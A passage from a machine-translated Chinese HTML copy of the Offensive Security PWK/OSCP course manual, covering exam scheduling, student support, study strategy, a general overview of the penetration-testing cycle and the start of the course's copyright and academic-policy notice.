<div style="position:absolute;top:20850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font><font style="vertical-align: inherit;">演练旨在说明所需的思维方式和方法</font></font></nobr></div>
<div style="position:absolute;top:20870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">达到最佳效果。</font></font></nobr></div>
<div style="position:absolute;top:20903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功通过 OSCP 考试后，您将可以访问子论坛</font></font></nobr></div>
<div style="position:absolute;top:20922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书持有者。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:20957;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.4 现场支持</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Live Support </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将允许您直接与我们的学生管理员沟通。</font><font style="vertical-align: inherit;">这些都是</font></font></nobr></div>
<div style="position:absolute;top:21014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻读 PWK 课程并通过 OSCP 的进攻性安全工作人员</font></font></nobr></div>
<div style="position:absolute;top:21033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">认证考试。</font></font></nobr></div>
<div style="position:absolute;top:21066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生管理员可以帮助解决技术问题，但他们也可以</font></font></nobr></div>
<div style="position:absolute;top:21085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">澄清课程材料和练习中的项目。</font><font style="vertical-align: inherit;">此外，如果您已尽力而为</font></font></nobr></div>
<div style="position:absolute;top:21105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完全卡在实验室机器上，学生管理员可能能够提供一个小提示</font></font></nobr></div>
<div style="position:absolute;top:21124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在你的路上帮助你。</font></font></nobr></div>
<div style="position:absolute;top:21157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，学生管理员提供的信息将基于</font></font></nobr></div>
<div style="position:absolute;top:21176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您能够提供的详细信息量。</font><font style="vertical-align: inherit;">您可以提供有关您已经拥有的内容的更多详细信息</font></font></nobr></div>
<div style="position:absolute;top:21196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试过并且您能够观察到的结果越好。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:21230;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.5 OSCP 考试尝试</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首次购买 PWK 课程包括参加 OSCP 认证考试。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4</font></font></font></nobr></div>
<div style="position:absolute;top:21287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考试是可选的，因此由您决定是否要解决它。</font><font style="vertical-align: inherit;">你有</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:21391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://forums.offensive-security.com</font></font></font></nobr></div>
<div style="position:absolute;top:21411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://support.offensive-security.com</font></font></font></nobr></div>
<div style="position:absolute;top:21431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://support.offensive-security.com/pwk-general-questions/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:21559;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="19"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 19 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:21592;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:22669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:22669;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:22669;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您的实验室时间结束后 120 天安排和完成您的考试尝试。</font><font style="vertical-align: inherit;">120后</font></font></nobr></div>
<div style="position:absolute;top:21707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">天，尝试将过期。</font></font></nobr></div>
<div style="position:absolute;top:21740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您的考试尝试过期，您可以购买额外的考试并在 120 分钟内参加考试</font></font></nobr></div>
<div style="position:absolute;top:21759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">购买日期的天数。</font></font></nobr></div>
<div style="position:absolute;top:21792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您在仍有未使用的考试尝试时购买实验室延期，则有效期为</font></font></nobr></div>
<div style="position:absolute;top:21812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的考试尝试将移至实验室延期结束后的 120 天。</font></font></nobr></div>
<div style="position:absolute;top:21844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要预订您的 OSCP 考试，请使用您的个性化考试安排链接。</font><font style="vertical-align: inherit;">此链接包含在</font></font></nobr></div>
<div style="position:absolute;top:21864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">欢迎包电子邮件。</font><font style="vertical-align: inherit;">您也可以使用 PWK 控制面板找到该链接。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:21901;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2 学习课程的总体策略</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个学生都是独一无二的，因此没有一种绝对最好的方法来学习这门课程和</font></font></nobr></div>
<div style="position:absolute;top:21962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">材料。</font><font style="vertical-align: inherit;">我们希望鼓励您以自己舒适的速度完成课程。</font></font></nobr></div>
<div style="position:absolute;top:21981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您还需要运用时间管理技能来保持自己的正轨。</font></font></nobr></div>
<div style="position:absolute;top:22014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们推荐以下作为课程材料的通用方法：</font></font></nobr></div>
<div style="position:absolute;top:22047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 查看欢迎和课程信息电子邮件中包含的所有信息。</font></font></nobr></div>
<div style="position:absolute;top:22075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 查看课程材料。</font></font></nobr></div>
<div style="position:absolute;top:22104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 完成所有课程练习。</font></font></nobr></div>
<div style="position:absolute;top:22132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 攻击实验室机器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:22167;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2.1 欢迎和课程信息电子邮件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，花点时间阅读您收到的电子邮件中包含的所有信息</font></font></nobr></div>
<div style="position:absolute;top:22224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你的课程开始日期。</font><font style="vertical-align: inherit;">这些电子邮件包括您的 VPN 包、实验室和论坛凭据等内容，</font></font></nobr></div>
<div style="position:absolute;top:22243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和控制面板 URL。</font><font style="vertical-align: inherit;">它们还包含课程常见问题解答的 URL，特别是有用的论坛主题，</font></font></nobr></div>
<div style="position:absolute;top:22262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和支持页面。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:22297;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2.2 课程资料</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看上述信息后，您可以跳转到课程材料。</font><font style="vertical-align: inherit;">你可以</font></font></nobr></div>
<div style="position:absolute;top:22354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择从课程视频开始，然后在实验室中查看给定模块的信息</font></font></nobr></div>
<div style="position:absolute;top:22374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指导或反之亦然，具体取决于您喜欢的学习方式。</font><font style="vertical-align: inherit;">当你完成课程时</font></font></nobr></div>
<div style="position:absolute;top:22393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">材料，您可能需要重新观看或重新阅读模块以完全掌握内容。</font></font></nobr></div>
<div style="position:absolute;top:22426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们建议将课程视为马拉松而不是短跑。</font><font style="vertical-align: inherit;">不要害怕花额外的钱</font></font></nobr></div>
<div style="position:absolute;top:22445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在继续课程之前，有一些困难的概念。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:22479;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2.3 课程练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们建议您在继续之前完全完成每个模块末尾的练习</font></font></nobr></div>
<div style="position:absolute;top:22537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到下一个模块。</font><font style="vertical-align: inherit;">他们将测试您对材料的理解并建立您的信心</font></font></nobr></div>
<div style="position:absolute;top:22556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">前进。</font></font></nobr></div>
<div style="position:absolute;top:22589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成这些练习所需的时间和精力可能取决于您现有的技能组合。</font></font></nobr></div>
<div style="position:absolute;top:22608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，有些练习很困难，可能需要很长时间。</font><font style="vertical-align: inherit;">我们想要</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:22747;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="20"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 20 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:22780;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:23857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:23857;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:23857;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鼓励您坚持不懈，尤其是在进行更艰难的练习时。</font><font style="vertical-align: inherit;">他们特别有帮助</font></font></nobr></div>
<div style="position:absolute;top:22895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发展这种 Offsec “Try Harder” 的心态。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:22930;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2.4 PWK 实验室</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成课程材料后，您应该准备好进行实验</font></font></nobr></div>
<div style="position:absolute;top:22987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">妥协每台机器并获得高特权交互式shell的目标。</font></font></nobr></div>
<div style="position:absolute;top:23020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">课程练习包括有关各种实验室机器的信息，如果您一直勤奋</font></font></nobr></div>
<div style="position:absolute;top:23039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过记笔记，您将有足够的时间去寻找实验室中的一些“唾手可得的成果”。</font></font></nobr></div>
<div style="position:absolute;top:23072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下一步是应用从课程中学到的过程，从彻底执行</font></font></nobr></div>
<div style="position:absolute;top:23091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在网络的其余部分收集信息并使用来自受感染机器的信息</font></font></nobr></div>
<div style="position:absolute;top:23111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以定位其他目标。</font><font style="vertical-align: inherit;">如果您正在为如何接近特定机器而苦苦挣扎，请考虑</font></font></nobr></div>
<div style="position:absolute;top:23130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为第一步去学生论坛。</font></font></nobr></div>
<div style="position:absolute;top:23163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果论坛没有为您提供任何有用的信息，您应该联系在线支持</font></font></nobr></div>
<div style="position:absolute;top:23182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看看是否有任何额外的指导可用。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:23219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.3 获得支持</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 不是固定节奏的课程。</font><font style="vertical-align: inherit;">这意味着您可以按照自己的节奏进行，花费额外的费用</font></font></nobr></div>
<div style="position:absolute;top:23280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间在对你来说困难的话题上。</font><font style="vertical-align: inherit;">利用本课程的节奏，不要</font></font></nobr></div>
<div style="position:absolute;top:23300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">害怕在一个棘手的新话题或方法上花更长时间的角力。</font><font style="vertical-align: inherit;">没有更大的感觉</font></font></nobr></div>
<div style="position:absolute;top:23319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而不是自己想办法！</font></font></nobr></div>
<div style="position:absolute;top:23352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">话虽如此，有时联系支持人员是非常合适的。</font><font style="vertical-align: inherit;">在你做之前，</font></font></nobr></div>
<div style="position:absolute;top:23371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请理解，我们希望您之前已经阅读了所有课程材料</font></font></nobr></div>
<div style="position:absolute;top:23391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入实验室，并会在需要时毫不犹豫地将您推荐回课程材料。</font></font></nobr></div>
<div style="position:absolute;top:23410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不仅如此，我们还希望您自己通过以下方式深入研究该主题领域</font></font></nobr></div>
<div style="position:absolute;top:23429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行额外的研究。</font></font></nobr></div>
<div style="position:absolute;top:23462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在联系支持人员之前，以下常见问题解答页面可能有助于回答您的一些问题</font></font></nobr></div>
<div style="position:absolute;top:23481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（两者都可以在没有 VPN 的情况下访问）：</font></font></nobr></div>
<div style="position:absolute;top:23514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:23514;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://support.offensive-security.com/</font></font></nobr></div>
<div style="position:absolute;top:23543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:23543;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.offensive-security.com/faq/</font></font></nobr></div>
<div style="position:absolute;top:23575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您的问题没有在那里得到解决，我们建议您查看学生论坛，</font></font></nobr></div>
<div style="position:absolute;top:23595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也可以在内部 VPN 实验室网络之外访问。</font><font style="vertical-align: inherit;">如果您仍然无法找到</font></font></nobr></div>
<div style="position:absolute;top:23614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您需要的帮助，您可以通过访问 Live Support </font><font style="font-size:8px"><font style="vertical-align: inherit;">5</font></font><font style="vertical-align: inherit;">与我们的学生管理员取得联系</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font></nobr></div>
<div style="position:absolute;top:23634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在支持页面上或发送电子邮件 (help@offensive-security.com)。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:23807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://support.offensive-security.com</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:23935;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="21"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 21 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:23968;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:25045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:25045;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:25045;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:24064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.4 关于渗透测试</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试是针对目标或边界的研究和攻击的持续循环。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:24125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该对攻击进行结构化、计算，并在可能的情况下在实验室中进行验证，然后再进行</font></font></nobr></div>
<div style="position:absolute;top:24144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在实时目标上实施。</font><font style="vertical-align: inherit;">这是我们如何可视化渗透测试的过程：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24612;left:292"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 1：渗透测试方法图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如模型可能暗示的那样，您收集的信息越多，出现问题的概率就越高</font></font></nobr></div>
<div style="position:absolute;top:24662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功渗透。</font><font style="vertical-align: inherit;">一旦你穿透了初始目标边界，你通常会开始</font></font></nobr></div>
<div style="position:absolute;top:24681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次循环。</font><font style="vertical-align: inherit;">例如，您可能会收集有关内部网络的信息，以便</font></font></nobr></div>
<div style="position:absolute;top:24700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">深入它。</font></font></nobr></div>
<div style="position:absolute;top:24733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最终，每个安全专业人员都会开发自己的特定方法，通常基于</font></font></nobr></div>
<div style="position:absolute;top:24752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在特定的技术优势上。</font><font style="vertical-align: inherit;">我们鼓励您查看 Open Web 等页面</font></font></nobr></div>
<div style="position:absolute;top:24772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Application Security Project (OWASP) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些常用的渗透测试</font></font></nobr></div>
<div style="position:absolute;top:24791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法论。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:24829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.5 法律</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请花时间阅读我们下面的正式版权声明。</font></font></nobr></div>
<div style="position:absolute;top:24903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您这样做之前，我们想解释一下，本出版物仅供您个人使用。</font><font style="vertical-align: inherit;">任何</font></font></nobr></div>
<div style="position:absolute;top:24922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制本出版物或与任何第三方共享本出版物的全部或部分内容均属违反</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:24995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（OWASP，2019 年），https://www.owasp.org/index.php/Penetration_testing_methodologies</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:25123;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="22"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 22 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:25156;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:26233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:26233;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:26233;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:25252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(a) 我们的知识产权 (b) 您在注册时接受的合同条款</font></font></nobr></div>
<div style="position:absolute;top:25271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们 (c) 我们的学术政策。</font></font></nobr></div>
<div style="position:absolute;top:25304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这包括：</font></font></nobr></div>
<div style="position:absolute;top:25337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:25337;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过在任何第三方平台上发布本出版物，使其他人可以使用，</font></font></nobr></div>
<div style="position:absolute;top:25356;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储库或社交媒体网站</font></font></nobr></div>
<div style="position:absolute;top:25384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:25384;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无意共享此出版物，因为您没有采取足够的措施来保护</font></font></nobr></div>
<div style="position:absolute;top:25404;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它</font></font></nobr></div>
<div style="position:absolute;top:25432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:25432;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将本出版物的全部或部分用于您个人培训以外的任何目的</font></font></nobr></div>
<div style="position:absolute;top:25451;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括提供或告知任何其他培训课程的内容或为任何其他</font></font></nobr></div>
<div style="position:absolute;top:25471;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">商业目的。</font></font></nobr></div>
<div style="position:absolute;top:25503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的学术政策可以在 https://www.offensive-security.com/legal-docs/ 在我们的</font></font></nobr></div>
<div style="position:absolute;top:25523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">酌情决定权，如果我们发现您违反：</font></font></nobr></div>
<div style="position:absolute;top:25556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:25556;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将撤销您已获得的所有现有进攻性安全认证</font></font></nobr></div>
